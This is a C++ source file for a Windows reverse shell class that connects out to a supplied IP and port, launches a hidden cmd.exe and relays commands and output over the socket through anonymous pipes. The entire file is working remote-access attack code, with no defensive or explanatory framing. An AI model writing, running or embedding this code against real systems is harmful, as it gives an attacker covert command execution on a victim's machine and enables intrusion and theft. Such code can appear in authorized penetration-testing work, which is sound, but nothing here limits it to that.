#include "shell.h"
#include <iostream>
#include <windows.h>
#include <fstream>
#include <thread>


// #pragma comment(lib,"ws2_32.lib")

Shell::Shell(const std::string& ip, int port)
    : _ip(ip), _port(port), _socket(INVALID_SOCKET), _initialized(false) {}

Shell::~Shell() {
    if(_socket != INVALID_SOCKET) closesocket(_socket);
    if(_initialized) WSACleanup();
}

bool Shell::initializeWinsock() {
    WSADATA wsaData;
    _initialized = (WSAStartup(MAKEWORD(2,2), &wsaData) == 0);
    return _initialized;
}

SOCKET Shell::createSocket() {
    _socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    return _socket;
}

bool Shell::connectToServer() {
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(_port);
    server.sin_addr.s_addr = inet_addr(_ip.c_str());

    return ::connect(_socket, (SOCKADDR*)&server, sizeof(server)) != SOCKET_ERROR;
}

void Shell::setupRedirection() {
    // Anonymous pipes (mandatory with windows otherwise does not work)
    // Windows does not allow to give a SOCKET as an HANDLE to CreateProcessA.
    // So, it requires anonymous pipes to interconnect the socket and the shell.

    // Anonymous pipes
    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    // Create pipes
    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
    CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);

    // Configure STARTUPINFO
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    PROCESS_INFORMATION pi = {};

    // char* cmd = "cmd.exe /K";

    BOOL success = CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe /K",
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);

    if(!success) {
        std::cerr << "[-] CreateProcessA failed: " << GetLastError() << std::endl;
        pi.hProcess = NULL;
    }

    
    // Thread: socket → hStdInWrite
    std::thread([this, hStdInWrite, pi]() {
        char buffer[1024];
        int len;
        while ((len = recv(_socket, buffer, sizeof(buffer), 0)) > 0) {
            DWORD written;
            WriteFile(hStdInWrite, buffer, len, &written, NULL);
            std::cout << "[>] Sent to shell: " << std::string(buffer, len) << std::endl;
        }
        std::cout << "[!] Socket closed, terminating shell\n";
        TerminateProcess(pi.hProcess, 0);
    }).detach();

    // Thread: hStdOutRead → socket
    std::thread([this, hStdOutRead]() {
        char buffer[1024];
        DWORD read;
        while (ReadFile(hStdOutRead, buffer, sizeof(buffer), &read, NULL)) {
            send(_socket, buffer, read, 0);
            std::cout << "[<] Received from shell: " << std::string(buffer, read) << std::endl;
        }
    }).detach();

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

}

bool Shell::connect() {
    return initializeWinsock() && createSocket() != INVALID_SOCKET && connectToServer();
}

void Shell::launchReverseShell() {
    if(connect()) setupRedirection();
}
